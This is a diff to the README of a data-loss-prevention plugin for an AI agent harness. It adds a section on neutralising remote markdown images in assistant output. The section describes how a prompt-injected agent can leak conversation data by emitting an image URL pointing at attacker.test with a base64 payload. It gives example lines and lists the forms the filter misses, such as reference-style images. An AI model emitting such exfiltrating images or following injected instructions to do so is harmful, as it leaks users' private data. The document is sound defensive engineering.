@@ -3,7 +3,7 @@
 Data-loss prevention for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness),
 built as an out-of-repo plugin.
 
-It does five things:
+It does six things:
 
 1. **Denies credential-file access and secrets bound for the network** — unconditionally, from
    `ctx.tools.guard()`. It tests the path-typed arguments of a call against a table of
@@ -15,7 +15,11 @@ It does five things:
 4. **Strips the invisible characters that carry hidden instructions** out of tool results —
    the Tags block and bidi overrides — and counts the classes it will not touch because they
    also appear in legitimate text.
-5. **Writes an audit record for every decision** to its own sink — rule id, rule version,
+5. **Neutralises remote markdown images in assistant output** — a partial mitigation for a
+   defect in the harness rather than in your configuration
+   ([see below](#mitigations-for-defects-in-the-harness-itself)), including what it does not
+   close.
+6. **Writes an audit record for every decision** to its own sink — rule id, rule version,
    offsets, and a keyed hash. Never the secret, and never the path or command that matched.
    `dsh-dlp report` reads that sink back.
 
@@ -56,7 +60,8 @@ More limits worth stating up front:
 - **Already-logged history cannot be rewritten; a not-yet-logged inbound message can.** At
   `llm/stream` the options are deep-frozen and `next()` takes no arguments, so a request the
   agent has assembled goes out as it stands and a secret already in the conversation reaches
-  the provider. That is not the whole rule, though: `agent/pre-step` is an async waterfall
+  the provider. (The same waterfall's *response* side is writable, and that is where remote
+  image destinations are neutralised — see below.) That is not the whole rule, though: `agent/pre-step` is an async waterfall
   returning `{ kind: 'enter'; messages }`, and the only production append of `user/message`
   happens *after* it, so a message arriving from outside can still be rewritten before it is
   logged or presented. This release does not do that; it is recorded here because the earlier
@@ -90,6 +95,58 @@ More limits worth stating up front:
 - **`$DSH_HOME` is readable by a read-only tool.** Profile manifests and the installed plugin
   tree are ordinary work to read, so which plugins a profile loads is model-visible. Only writes
   are denied wholesale there, plus reads of the credential material inside it.
+
+---
+
+## Mitigations for defects in the harness itself
+
+One of this plugin's registrations works around a defect in DeepSeek Harness, not in a
+deployment's configuration. **It does not close its channel**, an upstream fix is better, and
+it is written up in `../disclosures/findings/`. It is here because we build on this seam today
+and wanted the accident case narrowed while the upstream question is open.
+
+### Remote markdown images in assistant output (finding 001)
+
+The web UI renders any absolute `http(s)` markdown image a model emits as a real `<img src>`,
+and the harness sets no Content-Security-Policy. An injected agent emitting
+`![](https://attacker.test/?d=<base64 of something you said>)` makes **your browser** issue that
+request; the harness process never sees it, so no guard, no DLP pass and no audit surface here
+can observe it.
+
+This plugin wraps the `llm/stream` waterfall and replaces the destination of every inline
+markdown image whose target is an absolute `http:`/`https:` URL, keeping the alt text:
+
+```
+![receipt](https://attacker.test/p?d=c2VjcmV0)   ->   ![receipt](dsh-dlp-blocked-remote-image)
+```
+
+The placeholder is deliberately not a URL, so the renderer takes its own "not an absolute
+destination" arm and shows the alt text instead of fetching anything. Rewriting happens before
+the text becomes an `assistant/chunk` or `assistant/message` event, so the session log and the
+rendered answer agree, and it happens on streamed deltas too — a destination arriving eight
+characters at a time is caught before any accumulation of it can render. The audit record names
+the **hostname only**, never the path or query string, because that is where an exfiltration
+payload rides.
+
+What it does not close:
+
+- **Only inline image syntax is matched.** A reference-style image (`![alt][ref]` with a
+  `[ref]: https://…` definition elsewhere) still renders and still fetches. We do not neutralise
+  those, because the definition is shared with ordinary links and killing it would break them.
+- **A destination form the pattern does not model gets through** — an alt text containing `]`,
+  unusual percent-encodings, or any future renderer-accepted syntax.
+- **Reasoning text is not touched**, because the UI renders it as plain text rather than
+  markdown. If that changes upstream, this stops covering it.
+- Raw HTML needs no handling: the renderer keeps `<img …>` as literal text and no HTML enters
+  the DOM. That is upstream doing the right thing, and it is why this only has to handle
+  markdown.
+- **This is a real behavioural change.** An assistant answer that legitimately links an image
+  loses it — the user sees the alt text instead of the picture. That is why it is a switch:
+  `remoteImageNeutralization: false` turns it off, and a deployment whose agents produce useful
+  images should turn it off and set a CSP at whatever serves the UI instead.
+- **The upstream fix is one `img-src` directive** in a Content-Security-Policy. That covers
+  every form, every client, and every channel of this shape at once. This plugin's version
+  covers the common syntax on one seam. Prefer the directive.
 
 ---
 
@@ -135,6 +192,7 @@ dsh plugin --profile <name> add ./dsh-dlp-0.1.0.tgz
     breadthTier: true
     resultRedaction: true
     telemetryRedaction: true
+    remoteImageNeutralization: true
     redactTelemetryWorkspacePaths: true
 ```
 
@@ -400,7 +458,11 @@ its own identity.
 }
 ```
 
-`kind` is one of `guard-deny`, `pre-execute-deny`, `result-redaction`, `telemetry-redaction`.
+`kind` is one of `guard-deny`, `pre-execute-deny`, `execution-mutation`, `result-redaction`,
+`telemetry-redaction`, `assistant-image-neutralized`. An `execution-mutation` record carries
+`mutatedFields` and, when a tool substitution happened, the `originalTool` the log recorded. An
+`assistant-image-neutralized` record carries `host` — the hostname of the blocked destination
+and nothing else from the URL.
 A `result-redaction` record may also carry `unicode`, a count of invisible-character runs per
 class — counts only, because a hidden instruction is exactly the content this file must not
 repeat. A record is written whenever there is something to say, including a result that was
